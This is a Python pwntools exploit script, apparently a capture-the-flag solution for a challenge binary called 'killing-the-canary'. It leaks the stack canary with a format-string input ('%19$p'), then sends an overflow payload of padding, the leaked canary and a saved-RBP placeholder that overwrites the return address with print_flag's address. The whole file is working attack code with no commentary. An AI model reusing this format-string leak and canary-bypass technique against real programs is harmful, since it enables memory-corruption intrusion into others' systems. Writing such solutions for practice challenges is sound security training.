#!/usr/bin/env python3
import re
from pwn import *

exe = ELF("./killing-the-canary")

r = process([exe.path])

r.recvuntil(b"What's your name? ")
r.sendline(b"%19$p")

val = r.recvuntil(b"What's your message? ")
canary = int(re.findall(b"0x([0-9a-f]+)", val)[0], 16)
log.info(f"canary: {canary:#x}")

win = exe.symbols['print_flag']
log.info(f"print_flag: {win:#x}")

payload = b"A" * 72
payload += p64(canary)
payload += p64(0)  # saved RBP
payload += p64(win)  # call print_flag

r.sendline(payload)
r.interactive()

